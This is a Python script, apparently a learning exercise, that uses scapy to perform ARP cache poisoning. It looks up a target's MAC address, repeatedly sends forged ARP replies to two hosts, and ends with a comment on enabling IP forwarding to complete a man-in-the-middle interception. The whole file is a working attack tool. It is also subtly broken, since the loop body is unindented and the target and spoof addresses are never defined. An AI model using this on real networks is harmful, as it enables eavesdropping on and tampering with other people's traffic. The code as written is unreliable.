import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    arp_request_broadcast = broadcast/arp_request

    #show and print to see packets
    # print(arp_request_broadcast.summary())
    # arp_request_broadcast.show()
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

total_packets_sent = 0
try:
    while True:
    spoof(target_ip, spoof_ip)
    spoof(spoof_ip, target_ip)
    total_packets_sent += 2
    print("\rPacketz sent:" + str(total_packets_sent), end="")
    time.sleep(2)
except KeyboardInterrupt:
    print("...Quitting")

#Ip forwarding run "echo 1 > /proc/sys/net/ipv4/ip_forward" in linux shell in order to forward flow of packets coming into your computer to the router and back into the poisoned computer
